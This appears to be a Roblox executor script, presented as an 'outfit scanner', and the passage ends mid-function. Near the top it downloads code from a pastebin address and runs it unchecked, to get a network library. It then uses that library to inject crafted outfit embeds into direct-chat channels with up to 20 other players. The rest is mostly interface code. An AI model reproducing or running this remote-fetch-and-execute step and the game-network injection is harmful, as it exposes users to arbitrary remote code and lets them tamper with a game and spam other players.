-- Ultimate Roblox Workspace Metadata Engine & Layered Clothing Scanner (Standalone Server Edition)
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local MarketplaceService = game:GetService("MarketplaceService")
local InsertService = game:GetService("InsertService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
--logger
local LogService = game:GetService("LogService")

LogService.MessageOut:Connect(function(message, messageType)
    if messageType == Enum.MessageType.MessageOutput or messageType == Enum.MessageType.MessageError then
        if message:find("attempt to call a nil value") then
            print("🚨 ERROR DETECTED! Context trace:")
            print(debug.traceback()) -- Forces Lua to dump the actual local script lines
        end
    end
end)

---load network
pcall(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/GiEmv8Qf"))()
end)
task.wait(1)

getgenv().Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
getgenv().Get = getgenv().Get or (getgenv().g and getgenv().g.Get)


-- ============================================================
-- 🔥 AUTO‑ENABLE ANTI‑FIRE (Destroys all fire effects)
-- ============================================================
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local AntiFire = {
    enabled = false,
    queue = {},
    queueDirty = false,
    descConn = nil,
    heartbeatConn = nil,
}

local FIRE_CLASSES = {
    Fire = true,
    Smoke = true,
    Sparkles = true,
    ParticleEmitter = true,
    Beam = true,
}

local function isFireObject(obj)
    return FIRE_CLASSES[obj.ClassName] ~= nil
end

local function destroyFireObject(obj)
    pcall(function()
        if obj.ClassName ~= "Beam" then
            obj.Enabled = false
        end
        obj:Destroy()
    end)
end

local function destroyFireModel(model)
    for _, child in ipairs(model:GetDescendants()) do
        if isFireObject(child) then
            destroyFireObject(child)
        end
    end
    pcall(function() model:Destroy() end)
end

local function handleObject(obj)
    if not obj or not obj.Parent then return end
    if obj.ClassName == "Model" and obj.Name == "Fire" then
        destroyFireModel(obj)
    elseif isFireObject(obj) then
        destroyFireObject(obj)
    end
end

local function purgeAllFire()
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj.ClassName == "Model" and obj.Name == "Fire" then
            destroyFireModel(obj)
        elseif isFireObject(obj) then
            destroyFireObject(obj)
        end
    end
end

local function flushQueue()
    if not AntiFire.queueDirty then return end
    AntiFire.queueDirty = false
    local snapshot = AntiFire.queue
    AntiFire.queue = {}
    for _, obj in ipairs(snapshot) do
        handleObject(obj)
    end
end

function AntiFire.toggle(state)
    state = state == true
    if state == AntiFire.enabled then return end
    AntiFire.enabled = state

    if state then
        purgeAllFire()
        if AntiFire.descConn then AntiFire.descConn:Disconnect() end
        if AntiFire.heartbeatConn then AntiFire.heartbeatConn:Disconnect() end

        AntiFire.descConn = Workspace.DescendantAdded:Connect(function(obj)
            if not AntiFire.enabled then return end
            AntiFire.queue[#AntiFire.queue + 1] = obj
            AntiFire.queueDirty = true
        end)

        AntiFire.heartbeatConn = RunService.Heartbeat:Connect(function()
            if not AntiFire.enabled then return end
            flushQueue()
        end)

        print("✅ Anti‑Fire ENABLED (auto‑started)")
    else
        if AntiFire.descConn then
            AntiFire.descConn:Disconnect()
            AntiFire.descConn = nil
        end
        if AntiFire.heartbeatConn then
            AntiFire.heartbeatConn:Disconnect()
            AntiFire.heartbeatConn = nil
        end
        AntiFire.queue = {}
        AntiFire.queueDirty = false
        print("❌ Anti‑Fire DISABLED")
    end
end

-- ===== AUTO‑ENABLE ON LOAD =====
AntiFire.toggle(true)

-- Expose a global toggle so you can turn it off later (e.g. from console)
getgenv().AntiFire = AntiFire
getgenv().ToggleAntiFire = function(state)
    AntiFire.toggle(state)
end
-- ============================================================
-- Life Together RP Payload Formatter
local layerOrderMap = { TShirt=1, Shirt=2, Pants=3, Shorts=4, DressSkirt=5, Sweater=6, Jacket=7, Hair=8, LeftShoe=9, RightShoe=10 }

local function buildBatchPayload(data)
    local accessories = {}
    if data.Accessories then
        for _, acc in ipairs(data.Accessories) do
            local isLayered = acc.IsLayered == true
            
            -- Smart Order Fallback (Fixes overlaps for older saved outfits)
            local assignedOrder = tonumber(acc.Order)
            if not assignedOrder or assignedOrder <= 1 then
                local tName = tostring(acc.AccessoryType):gsub("Enum.AccessoryType.", ""):gsub("Accessory", "")
                assignedOrder = layerOrderMap[tName] or 5
            end

            table.insert(accessories, {
                AssetId = acc.AssetId,
                AccessoryType = acc.AccessoryType,
                IsLayered = isLayered,
                Rotation = "  ",
                Position = "  ",
                Scale = "1 1 1",
                Order = isLayered and assignedOrder or nil,
                Puffiness = isLayered and (tonumber(acc.Puffiness) or 0) or nil
            })
        end
    end

    -- Smart Skin Tone Encoder using captured valid strings
    local safeSkinString = "^l?B" -- Default to ligh tancolor
    if data.SkinTone then
        local r, g, b = data.SkinTone[1], data.SkinTone[2], data.SkinTone[3]
        if ((r + g + b) / 3) < 0.4 then
            safeSkinString = ";<,#" -- Dark Skin String
        end
    end

    return {
        accessories = accessories,
        properties = {
            Head = data.Head or 0,
            Torso = data.Torso or 0,
            LeftArm = data.LeftArm or 0,
            RightArm = data.RightArm or 0,
            LeftLeg = data.LeftLeg or 0,
            RightLeg = data.RightLeg or 0,
            Face = data.Face or 0,
            Shirt = data.Shirt or 0,
            Pants = data.Pants or 0,
            GraphicTShirt = data.GraphicTShirt or 0,
           
            RunAnimation = data.RunAnimation or 0,
            WalkAnimation = data.WalkAnimation or 0,
            JumpAnimation = data.JumpAnimation or 0,
            FallAnimation = data.FallAnimation or 0,
            ClimbAnimation = data.ClimbAnimation or 0,
            IdleAnimation = data.IdleAnimation or 0,
            SwimAnimation = data.SwimAnimation or 0,
            
            HeightScale = data.HeightScale or 1,
            WidthScale = data.WidthScale or 1,
            DepthScale = data.DepthScale or 1,
            HeadScale = data.HeadScale or 1,
            BodyTypeScale = data.BodyTypeScale or 0.25,
            ProportionScale = data.ProportionScale or 0,

            -- Automatically applies the safe string without crashing JSON
            HeadColor = safeSkinString,
            TorsoColor = safeSkinString,
            LeftArmColor = safeSkinString,
            RightArmColor = safeSkinString,
            LeftLegColor = safeSkinString,
            RightLegColor = safeSkinString,
        }
    }
end


-- Reusable Outfit Sharing Function
-- Reusable Outfit Sharing Function (Now with an excluded target!)
local function shareOutfitToAll(rawOutfitData, buttonElement, defaultText, defaultColor, excludedPlayer)
    local payload = buildBatchPayload(rawOutfitData)
    payload.makeups = {} -- Vital to prevent server crash
    
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    
    if not Send then 
        buttonElement.Text = "No Net"
        task.wait(2)
        buttonElement.Text = defaultText
        return 
    end

    buttonElement.Text = "Sharing..."
    buttonElement.BackgroundColor3 = Color3.fromRGB(150, 50, 150)

    task.spawn(function()
        local embedData = {
            outfit_id = -2,
            app = "Avatar",
            accept = "View",
            content = "Custom Outfit",
            func = "view_outfit",
            desc = payload
        }
        local embedJson = HttpService:JSONEncode(embedData)
        
        local sharedCount = 0
        local myId = LocalPlayer.UserId
        
        for _, p in ipairs(Players:GetPlayers()) do
            -- [UPDATED] Skip LocalPlayer AND skip the excludedPlayer!
            if p ~= LocalPlayer and p ~= excludedPlayer and sharedCount < 20 then
                task.spawn(function()
                    pcall(function()
                        local targetId = p.UserId
                        Send("can_users_direct_chat", myId, targetId)
                        
                        local channelStr = ""
                        if myId < targetId then
                            channelStr = tostring(myId) .. " " .. tostring(targetId)
                        else
                            channelStr = tostring(targetId) .. " " .. tostring(myId)
                        end
                        
                        Send("out_embed", channelStr, embedJson, "!EMBED")
                    end)
                end)
                sharedCount = sharedCount + 1
                task.wait(0.1) 
            end
        end
        
        if sharedCount > 0 then
            buttonElement.Text = "Shared!"
            buttonElement.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        else
            buttonElement.Text = "Failed"
            buttonElement.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        end
        
        task.wait(2)
        buttonElement.Text = defaultText
        buttonElement.BackgroundColor3 = defaultColor
    end)
end


local function shareOutfitToFriends(rawOutfitData, buttonElement, defaultText, defaultColor, excludedPlayer)
    local payload = buildBatchPayload(rawOutfitData)
    payload.makeups = {} -- Vital to prevent server crash
    
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    
    if not Send then 
        buttonElement.Text = "No Net"
        task.wait(2)
        buttonElement.Text = defaultText
        return 
    end

    buttonElement.Text = "Scanning..."
    buttonElement.BackgroundColor3 = Color3.fromRGB(150, 50, 150)

    task.spawn(function()
        local embedData = {
            outfit_id = -2,
            app = "Avatar",
            accept = "View",
            content = "Custom Outfit",
            func = "view_outfit",
            desc = payload
        }
        local embedJson = HttpService:JSONEncode(embedData)
        
        local sharedCount = 0
        local myId = LocalPlayer.UserId
        
               for _, p in ipairs(Players:GetPlayers()) do
            -- 🛡️ THE WHITELIST CHECK: massWhitelist[p.Name]
            if p ~= LocalPlayer and p ~= excludedPlayer and massWhitelist[p.Name] and sharedCount < 20 then
                task.spawn(function()

                     pcall(function()
                        local targetId = p.UserId
                        Send("can_users_direct_chat", myId, targetId)
                        
                        local channelStr = ""
                        if myId < targetId then
                            channelStr = tostring(myId) .. " " .. tostring(targetId)
                        else
                            channelStr = tostring(targetId) .. " " .. tostring(myId)
                        end
                        
                        Send("out_embed", channelStr, embedJson, "!EMBED")
                    end)
                end)
                sharedCount = sharedCount + 1
                task.wait(0.1) 
            end
        end
        
        if sharedCount > 0 then
            buttonElement.Text = "Sent to " .. tostring(sharedCount) .. " Friends!"
            buttonElement.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        else
            buttonElement.Text = "No Friends Here!"
            buttonElement.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        end
        
        task.wait(2)
        buttonElement.Text = defaultText
        buttonElement.BackgroundColor3 = defaultColor
    end)
end


-- Prevent duplicate GUIs
if LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeepMetadataScanner") then
    LocalPlayer.PlayerGui.DeepMetadataScanner:Destroy()
end
---

-- ==============================================================
-- 🛠️ REUSABLE UI COMPONENT LIBRARY (For Future Features)
-- ==============================================================

-- 1. Reusable Slider Function
local function createSlider(parent, titleText, minVal, maxVal, defaultVal, callback)
    local SliderFrame = Instance.new("Frame")
    SliderFrame.Size = UDim2.new(1, -5, 0, 50)
    SliderFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
    SliderFrame.BorderSizePixel = 0
    SliderFrame.Parent = parent
    Instance.new("UICorner", SliderFrame).CornerRadius = UDim.new(0, 8)

    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -10, 0, 20)
    Label.Position = UDim2.new(0, 10, 0, 5)
    Label.BackgroundTransparency = 1
    Label.Text = titleText .. ": " .. tostring(defaultVal)
    Label.TextColor3 = Color3.fromRGB(220, 220, 220)
    Label.Font = Enum.Font.SourceSansBold
    Label.TextSize = 14
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = SliderFrame

    local BarBg = Instance.new("Frame")
    BarBg.Size = UDim2.new(1, -20, 0, 10)
    BarBg.Position = UDim2.new(0, 10, 0, 30)
    BarBg.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    BarBg.BorderSizePixel = 0
    BarBg.Parent = SliderFrame
    Instance.new("UICorner", BarBg).CornerRadius = UDim.new(1, 0)

    local fillScale = (defaultVal - minVal) / (maxVal - minVal)
    local BarFill = Instance.new("Frame")
    BarFill.Size = UDim2.new(math.clamp(fillScale, 0, 1), 0, 1, 0)
    BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
    BarFill.BorderSizePixel = 0
    BarFill.Parent = BarBg
    Instance.new("UICorner", BarFill).CornerRadius = UDim.new(1, 0)

    local Handle = Instance.new("Frame")
    Handle.Size = UDim2.new(0, 16, 0, 16)
    Handle.AnchorPoint = Vector2.new(0.5, 0.5)
    Handle.Position = UDim2.new(1, 0, 0.5, 0)
    Handle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Handle.Parent = BarFill
    Instance.new("UICorner", Handle).CornerRadius = UDim.new(1, 0)

    local isDragging = false
    local function updateSlider(input)
        local pos = math.clamp((input.Position.X - BarBg.AbsolutePosition.X) / BarBg.AbsoluteSize.X, 0, 1)
        BarFill.Size = UDim2.new(pos, 0, 1, 0)
        local val = math.floor(minVal + (maxVal - minVal) * pos)
        Label.Text = titleText .. ": " .. tostring(val)
        callback(val)
    end

    BarBg.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = true
            updateSlider(input)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = false
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            updateSlider(input)
        end
    end)

    return SliderFrame
end

-- 2. Reusable "Hold To Interact" Button Function
local function createHoldButton(parent, titleText, color, onHoldStart, onHoldEnd)
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(1, -5, 0, 40)
    Btn.BackgroundColor3 = color or Color3.fromRGB(40, 40, 50)
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Font = Enum.Font.SourceSansBold
    Btn.TextSize = 16
    Btn.Text = titleText
    Btn.BorderSizePixel = 0
    Btn.Parent = parent
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 8)
    
    Btn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if onHoldStart then onHoldStart() end
        end
    end)
    
    Btn.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if onHoldEnd then onHoldEnd() end
        end
    end)
    return Btn
end

-- 3. Reusable "Fold For More" Dropdown Section (Like Avatar Scaler)
local function createCollapsible(parent, titleText, openHeight)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, -5, 0, 30)
    Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
    Frame.BorderSizePixel = 0
    Frame.ClipsDescendants = true
    Frame.Parent = parent

    local ToggleBtn = Instance.new("TextButton")
    ToggleBtn.Size = UDim2.new(1, 0, 0, 30)
    ToggleBtn.Text = "  " .. titleText .. " [ ▼ ]"
    ToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 200)
    ToggleBtn.Font = Enum.Font.SourceSansBold
    ToggleBtn.TextSize = 14
    ToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
    ToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
    ToggleBtn.BorderSizePixel = 0
    ToggleBtn.Parent = Frame

    local Content = Instance.new("Frame")
    Content.Size = UDim2.new(1, 0, 1, -30)
    Content.Position = UDim2.new(0, 0, 0, 30)
    Content.BackgroundTransparency = 1
    Content.Visible = false
    Content.Parent = Frame

    local expanded = false
    ToggleBtn.MouseButton1Click:Connect(function()
        expanded = not expanded
        if expanded then
            Frame.Size = UDim2.new(1, -5, 0, openHeight)
            Content.Visible = true
            ToggleBtn.Text = "  " .. titleText .. " [ ▲ ]"
        else
            Frame.Size = UDim2.new(1, -5, 0, 30)
            Content.Visible = false
            ToggleBtn.Text = "  " .. titleText .. " [ ▼ ]"
        end
    end)
    
    -- Return the Content frame so you can put buttons/sliders inside it!
    return Content 
end
-- 4. Reusable "Smart Hold" Button Logic (Swipe-Proof!)
local function applySmartHold(button, container, normalHeight, expandedHeight, holdTime, onShortClick, onUpdate)
    local holdTick = 0
    local isHolding = false
    local isExpanded = false
    local startPos = Vector3.new()

    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isHolding = true
            holdTick = tick()
            startPos = input.Position -- Record exactly where the touch started
            
            task.spawn(function()
                task.wait(holdTime)
                -- If they are STILL holding and haven't swiped away
                if isHolding then
                    isExpanded = not isExpanded
                    if isExpanded then
                        container.Size = UDim2.new(1, -5, 0, expandedHeight)
                    else
                        container.Size = UDim2.new(1, -5, 0, normalHeight)
                    end
                    if onUpdate then onUpdate(isExpanded) end
                end
            end)
        end
    end)

    -- NEW: Cancel the hold if the finger slides (Scrolling the UI)
    button.InputChanged:Connect(function(input)
        if isHolding and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local dist = (input.Position - startPos).Magnitude
            if dist > 15 then -- If moved more than 15 pixels, it's a swipe!
                isHolding = false
            end
        end
    end)

    button.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            -- If the touch wasn't already cancelled by a swipe
            if isHolding then
                isHolding = false
                
                -- Verify one last time that they didn't drift
                local dist = (input.Position - startPos).Magnitude
                if dist <= 15 then
                    -- If released quickly, it's a normal click!
                    if tick() - holdTick < holdTime then
                        if onShortClick then onShortClick() end
                        if onUpdate then onUpdate(isExpanded) end
                    end
                end
            end
        end
    end)
end

--deep scan

-- Create Layout Screen UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DeepMetadataScanner"
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Drag Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 360, 0, 300)
MainFrame.Position = UDim2.new(0.5, -180, 0.15, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
MainFrame.BorderSizePixel = 1
MainFrame.BorderColor3 = Color3.fromRGB(0, 255, 150)
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui
MainFrame.ClipsDescendants = true

-- Top Title Bar Frame
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 35)
TopBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -90, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "🧬 Deep Live Outfit Scanner"
Title.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 15
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.BackgroundTransparency = 1
Title.Parent = TopBar

-- Close Button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 35, 0, 35)
CloseBtn.Position = UDim2.new(1, -35, 0, 0)
CloseBtn.Text = "X"
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.SourceSansBold
CloseBtn.TextSize = 16
CloseBtn.BorderSizePixel = 0
CloseBtn.Parent = TopBar

-- Minimize Button
local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 35, 0, 35)
MinBtn.Position = UDim2.new(1, -70, 0, 0)
MinBtn.Text = "-"
MinBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinBtn.Font = Enum.Font.SourceSansBold
MinBtn.TextSize = 18
MinBtn.BorderSizePixel = 0
MinBtn.Parent = TopBar

-- Back Button
local BackBtn = Instance.new("TextButton")
BackBtn.Size = UDim2.new(0, 60, 0, 25)
BackBtn.Position = UDim2.new(0, 10, 0, 45)
BackBtn.Text = "◀ Back"
BackBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
BackBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
BackBtn.Font = Enum.Font.SourceSansBold
BackBtn.TextSize = 14
BackBtn.BorderSizePixel = 0
BackBtn.Visible = false
BackBtn.Parent = MainFrame

-- Refresh Button (Left 1/3)
local RefreshBtn = Instance.new("TextButton")
RefreshBtn.Size = UDim2.new(0.33, -10, 0, 25)
RefreshBtn.Position = UDim2.new(0, 10, 0, 45)
RefreshBtn.Text = "Refresh"
RefreshBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
RefreshBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
RefreshBtn.Font = Enum.Font.SourceSansBold
RefreshBtn.TextSize = 14
RefreshBtn.BorderSizePixel = 0
RefreshBtn.Parent = MainFrame

-- Saved Outfits Tab (Middle 1/3)
local SavedTabBtn = Instance.new("TextButton")
SavedTabBtn.Size = UDim2.new(0.33, -5, 0, 25)
SavedTabBtn.Position = UDim2.new(0.33, 5, 0, 45)
SavedTabBtn.Text = "Saved"
SavedTabBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
SavedTabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SavedTabBtn.Font = Enum.Font.SourceSansBold
SavedTabBtn.TextSize = 14
SavedTabBtn.BorderSizePixel = 0
SavedTabBtn.Parent = MainFrame

-- Tools Tab (Right 1/3)
local ToolsTabBtn = Instance.new("TextButton")
ToolsTabBtn.Size = UDim2.new(0.33, -10, 0, 25)
ToolsTabBtn.Position = UDim2.new(0.66, 5, 0, 45)
ToolsTabBtn.Text = "Tools"
ToolsTabBtn.BackgroundColor3 = Color3.fromRGB(150, 80, 80)
ToolsTabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToolsTabBtn.Font = Enum.Font.SourceSansBold
ToolsTabBtn.TextSize = 14
ToolsTabBtn.BorderSizePixel = 0
ToolsTabBtn.Parent = MainFrame

-- Containers for Views
local ContentContainer = Instance.new("Frame")
ContentContainer.Size = UDim2.new(1, 0, 1, -80)
ContentContainer.Position = UDim2.new(0, 0, 0, 80)
ContentContainer.BackgroundTransparency = 1
ContentContainer.Parent = MainFrame

-- Helper function to make all tabs look beautiful and scroll perfectly
local function createTabScroll(name, isVisible)
    local scroll = Instance.new("ScrollingFrame")
    scroll.Name = name
    scroll.Size = UDim2.new(1, -16, 1, -10)
    scroll.Position = UDim2.new(0, 8, 0, 0)
    scroll.BackgroundColor3 = Color3.fromRGB(12, 12, 16) -- Darker, cleaner background
    scroll.ScrollBarThickness = 3
    scroll.BorderSizePixel = 0
    scroll.Visible = isVisible
    scroll.Parent = ContentContainer
    Instance.new("UICorner", scroll).CornerRadius = UDim.new(0, 8)
    
    -- Adding UIPadding fixes the cramped look and adds breathing room
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 8)
    padding.PaddingBottom = UDim.new(0, 40) -- Fixes bottom cutoff when shrunk!
    padding.PaddingLeft = UDim.new(0, 5)
    padding.PaddingRight = UDim.new(0, 5)
    padding.Parent = scroll
    
    local layout = Instance.new("UIListLayout")
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Padding = UDim.new(0, 8)
    layout.Parent = scroll
    
    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 50)
    end)
    
    return scroll, layout
end

-- Generates all tabs with perfect scrolling and padding instantly
local PlayerScroll, PlayerListLayout = createTabScroll("PlayerScroll", true)
local AssetScroll, AssetListLayout = createTabScroll("AssetScroll", false)
local SavedScroll, SavedListLayout = createTabScroll("SavedScroll", false)
local ToolsScroll, ToolsListLayout = createTabScroll("ToolsScroll", false)
-- ==========================================
-- 🔍 SEARCH BARS & GRID TOGGLES (MEMORY LIMIT BYPASS)
-- ==========================================
-- (No 'local' tags used here to bypass Delta's 200 Variable Crash limit)

PlayerSearchBar = Instance.new("Frame", ContentContainer)
PlayerSearchBar.Size, PlayerSearchBar.Position = UDim2.new(1, -16, 0, 30), UDim2.new(0, 8, 0, 0)
PlayerSearchBar.BackgroundColor3, PlayerSearchBar.BorderSizePixel = Color3.fromRGB(20, 20, 25), 0
Instance.new("UICorner", PlayerSearchBar).CornerRadius = UDim.new(0, 6)

SearchBox = Instance.new("TextBox", PlayerSearchBar)
SearchBox.Size, SearchBox.Position = UDim2.new(1, -40, 1, 0), UDim2.new(0, 10, 0, 0)
SearchBox.BackgroundTransparency, SearchBox.ClearTextOnFocus = 1, false
SearchBox.PlaceholderText, SearchBox.TextColor3 = "🔍 Search Players...", Color3.fromRGB(255, 255, 255)
SearchBox.Font, SearchBox.TextSize, SearchBox.TextXAlignment, SearchBox.Text = Enum.Font.SourceSansBold, 14, Enum.TextXAlignment.Left, ""


ViewToggleBtn = Instance.new("TextButton", PlayerSearchBar)
ViewToggleBtn.Size, ViewToggleBtn.Position = UDim2.new(0, 30, 0, 30), UDim2.new(1, -30, 0, 0)
ViewToggleBtn.BackgroundTransparency, ViewToggleBtn.Text = 1, "▦"
ViewToggleBtn.TextColor3, ViewToggleBtn.Font, ViewToggleBtn.TextSize = Color3.fromRGB(0, 255, 200), Enum.Font.SourceSansBold, 18

PlayerScroll.Position, PlayerScroll.Size = UDim2.new(0, 8, 0, 35), UDim2.new(1, -16, 1, -45)
if PlayerListLayout then PlayerListLayout:Destroy() end

PlayerGrid = Instance.new("UIGridLayout", PlayerScroll)
PlayerGrid.SortOrder, PlayerGrid.CellPadding = Enum.SortOrder.LayoutOrder, UDim2.new(0.02, 0, 0.02, 0)
PlayerGrid.CellSize = UDim2.new(0.235, 0, 0, 105) 
PlayerGrid:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    PlayerScroll.CanvasSize = UDim2.new(0, 0, 0, PlayerGrid.AbsoluteContentSize.Y + 10)
end)

isGridMode = true
ViewToggleBtn.MouseButton1Click:Connect(function()
    isGridMode = not isGridMode
    ViewToggleBtn.Text = isGridMode and "▦" or "☰"
    PlayerGrid.CellSize = isGridMode and UDim2.new(0.235, 0, 0, 105) or UDim2.new(1, -10, 0, 50)
    
    for _, btn in ipairs(PlayerScroll:GetChildren()) do
        if btn:IsA("TextButton") then
            local vp, dn, un = btn:FindFirstChild("ViewportFrame"), btn:FindFirstChild("DisplayName"), btn:FindFirstChild("Username")
            if vp and dn and un then
                if isGridMode then
                    vp.Size, vp.Position = UDim2.new(0, 60, 0, 60), UDim2.new(0.5, -30, 0, 5)
                    dn.Size, dn.Position, dn.TextXAlignment = UDim2.new(1, -4, 0, 15), UDim2.new(0, 2, 0, 70), Enum.TextXAlignment.Center
                    un.Size, un.Position, un.TextXAlignment = UDim2.new(1, -4, 0, 15), UDim2.new(0, 2, 0, 85), Enum.TextXAlignment.Center
                else
                    vp.Size, vp.Position = UDim2.new(0, 40, 0, 40), UDim2.new(0, 5, 0, 5)
                    dn.Size, dn.Position, dn.TextXAlignment = UDim2.new(1, -60, 0, 20), UDim2.new(0, 55, 0, 5), Enum.TextXAlignment.Left
                    un.Size, un.Position, un.TextXAlignment = UDim2.new(1, -60, 0, 20), UDim2.new(0, 55, 0, 25), Enum.TextXAlignment.Left
                end
            end
        end
    end
end)

SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
    local query = string.lower(SearchBox.Text)
    for _, child in ipairs(PlayerScroll:GetChildren()) do
        if child:IsA("TextButton") then
            local dn, un = child:FindFirstChild("DisplayName"), child:FindFirstChild("Username")
            if dn and un then
                child.Visible = (string.find(string.lower(dn.Text), query) or string.find(string.lower(un.Text), query)) ~= nil
            end
        end
    end
end)

-- SAVED OUTFITS SEARCH
SavedSearchBar = Instance.new("Frame", ContentContainer)
SavedSearchBar.Size, SavedSearchBar.Position = UDim2.new(1, -16, 0, 30), UDim2.new(0, 8, 0, 0)
SavedSearchBar.BackgroundColor3, SavedSearchBar.BorderSizePixel, SavedSearchBar.Visible = Color3.fromRGB(20, 20, 25), 0, false
Instance.new("UICorner", SavedSearchBar).CornerRadius = UDim.new(0, 6)

SavedSearchBox = Instance.new("TextBox", SavedSearchBar)
SavedSearchBox.Size, SavedSearchBox.Position = UDim2.new(1, -40, 1, 0), UDim2.new(0, 10, 0, 0)
SavedSearchBox.BackgroundTransparency, SavedSearchBox.ClearTextOnFocus = 1, false
SavedSearchBox.PlaceholderText, SavedSearchBox.TextColor3 = "🔍 Search Saved Outfits...", Color3.fromRGB(255, 255, 255)
SavedSearchBox.Font, SavedSearchBox.TextSize, SavedSearchBox.TextXAlignment, SavedSearchBox.Text = Enum.Font.SourceSansBold, 14, Enum.TextXAlignment.Left, ""


SavedViewToggleBtn = Instance.new("TextButton", SavedSearchBar)
SavedViewToggleBtn.Size, SavedViewToggleBtn.Position = UDim2.new(0, 30, 0, 30), UDim2.new(1, -30, 0, 0)
SavedViewToggleBtn.BackgroundTransparency, SavedViewToggleBtn.Text = 1, "▦"
SavedViewToggleBtn.TextColor3, SavedViewToggleBtn.Font, SavedViewToggleBtn.TextSize = Color3.fromRGB(0, 255, 200), Enum.Font.SourceSansBold, 18

SavedScroll.Position, SavedScroll.Size = UDim2.new(0, 8, 0, 35), UDim2.new(1, -16, 1, -45)
if SavedListLayout then SavedListLayout:Destroy() end

SavedGrid = Instance.new("UIGridLayout", SavedScroll)
SavedGrid.SortOrder, SavedGrid.CellPadding = Enum.SortOrder.LayoutOrder, UDim2.new(0.02, 0, 0.02, 0)
SavedGrid.CellSize = UDim2.new(0.235, 0, 0, 105)
SavedGrid:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    SavedScroll.CanvasSize = UDim2.new(0, 0, 0, SavedGrid.AbsoluteContentSize.Y + 10)
end)

isSavedGridMode = true
SavedViewToggleBtn.MouseButton1Click:Connect(function()
    isSavedGridMode = not isSavedGridMode
    SavedViewToggleBtn.Text = isSavedGridMode and "▦" or "☰"
    SavedGrid.CellSize = isSavedGridMode and UDim2.new(0.235, 0, 0, 105) or UDim2.new(1, -10, 0, 50)
    
